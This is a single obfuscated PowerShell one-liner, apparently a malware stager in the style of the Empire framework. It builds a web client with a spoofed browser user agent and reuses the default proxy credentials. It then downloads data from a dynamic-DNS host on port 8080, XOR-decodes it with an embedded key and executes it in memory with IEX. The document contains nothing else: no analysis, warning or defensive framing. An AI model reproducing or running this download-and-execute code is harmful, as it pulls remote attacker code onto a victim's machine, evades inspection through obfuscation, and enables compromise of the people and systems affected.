$wc=New-ObJeCT SYsTem.NeT.WEBClIEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeADERS.ADD('User-Agent',$u);$Wc.PRoxy = [SYstEm.Net.WEbREquesT]::DEFaUlTWeBPRoXY;$wC.PRoXY.CReDentIAlS = [SysTem.NET.CrEdentiALCAChE]::DefAULTNetworKCrEdEntiAlS;$K='pU*=9a_:VQi8#g[4d5zryv6RE-cL}{m)';$I=0;[cHAR[]]$B=([Char[]]($wC.DoWNLoaDStrIng("http://kernel32.ddns.net:8080/index.asp")))|%{$_-BXOR$k[$i++%$K.LEngTh]};IEX ($b-JoiN'')